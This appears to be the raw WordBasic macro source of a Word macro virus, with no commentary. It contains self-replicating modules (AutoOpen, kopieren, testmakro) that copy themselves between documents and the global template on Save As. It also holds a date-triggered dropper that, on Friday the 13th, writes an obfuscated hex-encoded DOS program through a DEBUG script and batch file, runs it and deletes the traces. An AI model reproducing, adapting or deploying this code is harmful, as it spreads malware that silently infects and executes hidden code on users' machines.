   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "testmakro"

   Public Sub MAIN()
   Dim Cnt
   Dim Founded
       Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dbox

       On Error GoTo -1: On Error GoTo Ende
       WordBasic.Dialog.FileSaveAs dbox
       If ((dbox.Format = 0) Or (dbox.Format = 1)) Then
           For Cnt = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](Cnt, 0, 1) = "AutoOpen" Then
                   Founded = Founded + 1
               ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "kopieren" Then
                   Founded = Founded + 1
               ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "testmakro" Then
                   Founded = Founded + 1
               End If
           Next Cnt

           If Founded = 3 Then
               WordBasic.FileSaveAs dbox
           Else

               WordBasic.MacroCopy "Global:AutoOpenDot", WordBasic.[WindowName$]() + ":AutoOpen"
               WordBasic.MacroCopy "Global:kopieren", WordBasic.[WindowName$]() + ":kopieren"
               WordBasic.MacroCopy "Global:DateiSpeichernUnter", WordBasic.[WindowName$]() + ":testmakro"
               dbox.Format = 1
               WordBasic.FileSaveAs dbox
           Else
               WordBasic.FileSaveAs dbox
   End If

   Ende:
   End If
   End Sub

   Attribute VB_Name = "kopieren"

   Public Sub MAIN()

       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":testmakro", "Global:DateiSpeichernUnter"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpenDot"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":kopieren", "Global:kopieren"

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
           WordBasic.Call "kopieren"
   If ((WordBasic.Day(WordBasic.Now()) = 13) And (WordBasic.Weekday(WordBasic.Now()) = 6)) Then
       payload
   End If
   End Sub

   Private Sub payload()
   Dim Ouput

   On Error GoTo -1: On Error GoTo NoDropper

   Open "C:\dos\debug.exe" For Input As 1
   Close 1

   Open "C:\dos\Markt.scr" For Ouput As 1
   Print #1, "N MARKT.COM"
   Print #1, "E 0100 E9 E5 03 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0110 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0120 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0130 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0140 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0150 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0160 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0170 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0180 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0190 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 01F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0200 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0210 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0220 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0230 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0240 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0250 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0260 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0270 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0280 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0290 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 02F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0300 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0310 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0320 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0330 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0340 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0350 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0360 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0370 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0380 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0390 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 03F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0400 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0410 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0420 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0430 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0440 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0450 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0460 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0470 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0480 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 0490 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 04A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 04B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 04C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 04D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90"
   Print #1, "E 04E0 90 90 90 90 90 90 90 90 90 90 BA 45 59 B8 01 FA"
   Print #1, "E 04F0 CD 16 E8 00 00 5D 55 5D 81 ED 10 01 C6 86 1B 01"
   Print #1, "E 0500 0A 8B C5 05 1A 01 50 EB 00 E8 D8 05 E8 C5 05 EB"
   Print #1, "E 0510 00 CE F7 93 42 FC 41 42 16 E6 E5 C8 BC C8 AD C2"
   Print #1, "E 0520 AD C3 41 F7 6E 8E 60 10 F5 59 CC 15 C1 8E 60 F7"
   Print #1, "E 0530 58 8E 60 7E 4E 43 35 47 7D 41 32 41 AA 6F 7D 45"
   Print #1, "E 0540 35 B9 F8 46 41 12 C1 C6 5A 42 40 AB 93 43 18 A1"
   Print #1, "E 0550 B5 AB D7 42 F5 69 8C 62 C1 BD 48 37 43 A8 59 F7"
   Print #1, "E 0560 6B 8E 60 C3 BB 4A 35 66 AA 4E F9 42 42 FA 40 43"
   Print #1, "E 0570 FB C3 41 8E 52 A8 BF 19 F5 59 8C 62 CA A6 72 83"
   Print #1, "E 0580 CA 9B CA 8B CA 93 CA B3 CA BB CA AB 82 F7 4E 8E"
   Print #1, "E 0590 51 71 A5 8E 51 CE F4 95 42 FA CC 41 A2 21 72 BC"
   Print #1, "E 05A0 F9 43 F9 CD 81 C8 96 70 81 BF ED 7F 61 31 44 E8"
   Print #1, "E 05B0 A3 BB AA 0F 7D 53 32 44 C1 A7 B1 49 A1 A8 B0 7F"
   Print #1, "E 05C0 59 37 52 30 58 6F 51 41 81 41 81 41 81 41 81 C3"
   Print #1, "E 05D0 A5 CC 4B A3 AA 99 C0 81 E1 43 CA B9 AA 91 7D 58"
   Print #1, "E 05E0 33 44 34 8F C1 B7 C1 A8 86 7F 58 C8 98 EF CB 8B"
   Print #1, "E 05F0 F1 63 35 41 ED 08 73 AE 00 B0 EA C8 8A 0A A1 E9"
   Print #1, "E 0600 F9 42 42 FA 40 43 FB C3 41 8E 52 B9 F1 41 F8 8C"
   Print #1, "E 0610 46 70 93 8E 67 DA 8C 65 BF 83 7D 5A 34 B4 AA BD"
   Print #1, "E 0620 14 C8 AD C0 AD 03 F5 04 73 91 CC 35 81 8E 60 F7"
   Print #1, "E 0630 7A CE D4 20 43 8E 60 AB 51 43 F5 78 CC 15 81 8E"
   Print #1, "E 0640 60 C8 A4 1E A9 E0 41 80 1D 43 14 F7 6E 8E 60 10"
   Print #1, "E 0650 CA AF C0 AF C1 43 F5 59 CC 15 C1 8E 60 F7 0E C3"
   Print #1, "E 0660 AD 42 F8 53 41 CE D4 85 43 8E 60 31 6A C3 3F D6"
   Print #1, "E 0670 51 36 5E C3 3F DD 6F 37 58 F7 7A CE 17 DD 8C 62"
   Print #1, "E 0680 A9 84 BE AB 25 43 DD F7 7A CE D4 80 43 8E 60 DE"
   Print #1, "E 0690 32 4E F5 0C 8C 62 32 96 CC D6 8B 41 A9 55 41 C8"
   Print #1, "E 06A0 A4 F7 5B 19 8C 62 1C 80 6F 6D 41 69 6F 69 41 69"
   Print #1, "E 06B0 6F 00 0E 0E 41 16 F5 6C 8C 62 12 C8 AD C2 AD C3"
   Print #1, "E 06C0 41 11 F5 59 CC 15 C1 8E 60 F7 0E C3 AD 42 F8 64"
   Print #1, "E 06D0 41 19 8C 62 33 4F A9 51 41 30 46 F7 11 C3 AD 42"
   Print #1, "E 06E0 AA B3 CA A6 F5 59 1B 8E 60 1E 82 F7 6E 8E 60 C8"
   Print #1, "E 06F0 B2 85 C4 8C 42 43 C0 3F 5B 41 B8 35 42 AA EA 43"
   Print #1, "E 0700 C0 3F 5B D3 40 31 76 C2 3D 59 59 B5 36 73 C0 3F"
   Print #1, "E 0710 5B E6 47 37 68 FB 41 7E CC 17 5F 8E 60 D0 F5 7C"
   Print #1, "E 0720 F8 40 41 CE D4 93 42 8E 60 FB 43 01 D8 C8 8B 8E"
   Print #1, "E 0730 60 D1 F5 7D 8C 62 D3 6E 41 45 78 C6 90 40 35 28"
   Print #1, "E 0740 C0 FE 91 40 0C 19 35 20 C0 FE 91 40 1B 0E 35 18"
   Print #1, "E 0750 C0 FE 91 40 D1 D3 35 10 87 C6 8E 40 40 46 BC 46"
   Print #1, "E 0760 C8 C6 95 40 F9 42 02 70 88 CE 15 5D 8C 62 F9 41"
   Print #1, "E 0770 7C 8E 60 D0 F5 02 C1 AF 40 FA 42 43 CC D6 92 40"
   Print #1, "E 0780 8C 62 F9 41 03 DA CA 89 8C 62 17 AB FA 41 1F FB"
   Print #1, "E 0790 40 14 CA 0F 57 C8 15 5B 8C 62 F5 7D 8C 62 F9 42"
   Print #1, "E 07A0 02 71 AC C9 0D 56 CC 17 5F 8E 60 C3 FC 8C 42 42"
   Print #1, "E 07B0 A9 74 BE 80 40 8E 61 D3 A8 A6 42 4C 51 5A 44 47"
   Print #1, "E 07C0 5B 00 9D 5B 58 46 55 5A 45 4C 9A 5A 42 98 58 4F"
   Print #1, "E 07D0 9A 63 9E 5A 4D 98 58 40 9A 5A 4A 98 58 46 9A 63"
   Print #1, "E 07E0 61 5B 51 5A 44 57 58 40 9A 98 58 41 9A 98 61 9F"
   Print #1, "E 07F0 5B 40 9E 9F 61 63 5B 40 9D 98 61 98 61 9F 5B 40"
   Print #1, "E 0800 9E 98 58 47 9A 98 58 41 9A 98 61 9F 5B 40 9E 98"
   Print #1, "E 0810 61 53 9A 98 55 9F 61 98 61 9F 9E 63 61 53 9A 98"
   Print #1, "E 0820 55 98 61 5B 51 5A 44 57 58 41 9A 63 9A 63 61 98"
   Print #1, "E 0830 61 98 61 98 5B 40 9D 98 61 98 58 40 9A 63 9A 63"
   Print #1, "E 0840 9A 5A 42 98 58 40 9A 63 9A 63 61 98 61 98 61 98"
   Print #1, "E 0850 58 40 9A 63 9A 5A 43 98 9A 5A 45 98 61 63 59 53"
   Print #1, "E 0860 58 46 55 63 61 98 61 63 9A 63 9A 63 61 98 61 98"
   Print #1, "E 0870 58 46 9A 5A 42 98 61 98 61 98 58 40 9A 5A 43 98"
   Print #1, "E 0880 61 63 9A 63 9A 63 61 98 61 98 58 40 9A 63 9A 5A"
   Print #1, "E 0890 43 98 61 9C 9D 5A 43 98 61 63 59 53 58 46 55 63"
   Print #1, "E 08A0 9A 5A 43 98 9A 5A 43 98 61 9C 5B 40 9D 9C 61 9C"
   Print #1, "E 08B0 5B 40 9D 9C 61 98 61 9C 5B 40 9D 98 61 63 9A 5A"
   Print #1, "E 08C0 43 98 9A 5A 43 98 61 9C 5B 40 9D 98 61 98 58 41"
   Print #1, "E 08D0 9A 5A 43 98 61 63 9A 63 61 5B 51 5A 44 47 5B 00"
   Print #1, "E 08E0 9E 5B 58 5D 46 9F 9D 9F 5B 4B 9A 9F 9D 9F 59 5A"
   Print #1, "E 08F0 5D 9F 5B 53 9A 9F 59 5A 5A 9D 9A 98 9A 43 56 6E"
   Print #1, "E 0900 7C 7D 61 58 12 36 19 1B 60 63 5A 7F 7C 6E 46 53"
   Print #1, "E 0910 9A 98 9A 9E 59 5A 5A 59 55 98 59 5A 5A 9D 5B 51"
   Print #1, "E 0920 9A 9E 59 5A 5D 9C 9A 47 56 9F 9D 53 9A 54 9D 9F"
   Print #1, "E 0930 46 53 5B 47 9A 47 56 9F 9D 53 9A 54 9D 9F 46 53"
   Print #1, "E 0940 9A 9C 59 5A 5D 9F 9A 47 5B 47 9A 54 9E 44 51 98"
   Print #1, "E 0950 61 98 45 54 9E 53 5B 47 9A 44 9A 9F 59 5A 5D 98"
   Print #1, "E 0960 9A 98 45 54 9E 9C 46 53 9A 98 9A 5A 43 98 9A 98"
   Print #1, "E 0970 45 54 9E 9C 46 53 9A 98 9A 5B 58 5F 9E 98 9A 9C"
   Print #1, "E 0980 9A 98 9A 9E 61 9F 61 9D 9A 98 9A 9C 9A 98 9E 5B"
   Print #1, "E 0990 58 5D 9D 9E 9A 9E 9A 9C 9A 98 9A 9C 9A 9D 9A 9D"
   Print #1, "E 09A0 9D 5B 58 5D 9A 98 9D 9D 9A 9D 9A 63 9A 9E 9A 9E"
   Print #1, "E 09B0 9D 98 9A 5B 58 5C 9E 59 4B 98 9E 5B 58 62 9E 59"
   Print #1, "E 09C0 47 98 9E 5B 59 5A 4A 4C 14 33 32 6F 61 22 2D 2F"
   Print #1, "E 09D0 61 07 28 30 2A 64 32 63 27 31 2E 2E 61 4F 5A 00"
   Print #1, "E 09E0 7B 63 35 2C 61 19 7B 63 15 31 20 30 29 26 25 62"
   Print #1, "E 09F0 61 4C 5A 10 2E 31 33 3A 61 22 23 2C 34 37 61 37"
   Print #1, "E 0A00 29 22 35 62 59 5A 49 37 2E 63 00 0F 0D 63 0C 2A"
   Print #1, "E 0A10 2D 2A 35 22 33 3A 61 0A 2F 35 24 2D 35 2C 33 30"
   Print #1, "E 0A20 61 2A 35 30 61 17 28 2E 24 63 35 2C 61 24 28 35"
   Print #1, "E 0A30 24 63 34 30 61 37 29 26 61 17 20 20 29 3A 2E 2D"
   Print #1, "E 0A40 20 37 2E 31 60 5B 59 5B 41 16 CA AC CC F5 AE 45"
   Print #1, "E 0A50 73 A7 8C 59 C8 17 48 C3 35 42 49 C3 35 4B 40 C2"
   Print #1, "E 0A60 35 48 40 42 CC FD 41 44 F8 53 41 15 10 B0 E5 CE"
   Print #1, "E 0A70 F7 E8 47 FA 44 43 B2 E7 18 1D 00 B0 E5 F7 00 C3"
   Print #1, "E 0A80 AD 42 CC D5 42 42 CC F5 41 44 BE 95 CA BE 1C 80"
   Print #1, "E 0A90 F8 BE 44 8E 60 20 4D 65 64 69 61 4D 61 72 6B 74"
   Print #1, "E 0AA0 20 57 65 72 62 65 56 69 72 75 73 20 27 39 34 20"
   Print #1, "E 0AB0 20 28 63 29 20 4D 65 64 69 61 4D 61 72 6B 74 20"
   Print #1, "E 0AC0 47 65 72 6D 61 6E 79 20 20 54 68 65 20 57 69 7A"
   Print #1, "E 0AD0 61 72 64 20 8D BE 2C 01 B9 C2 02 81 35 43 41 47"
   Print #1, "E 0AE0 47 E2 F8 90 C3"
   Print #1, "RCX"
   Print #1, "09E5"
   Print #1, "W"
   Print #1, "Q"
   Close 1

   Open "C:\dos\Markt.bat" For Output As 1
   Print #1, "@echo off"
   Print #1, "debug < Markt.scr > nul"
   Print #1, "@echo off"
   Print #1, "Markt.com"
   Close 1

   WordBasic.ChDir "C:\dos"
   WordBasic.Shell "Markt.bat", 0
   WordBasic.Kill "Markt.bat"
   WordBasic.Kill "Markt.scr"
   WordBasic.Kill "Markt.com"

   WordBasic.ChDir "C:\"
   NoDropper:

   End Sub
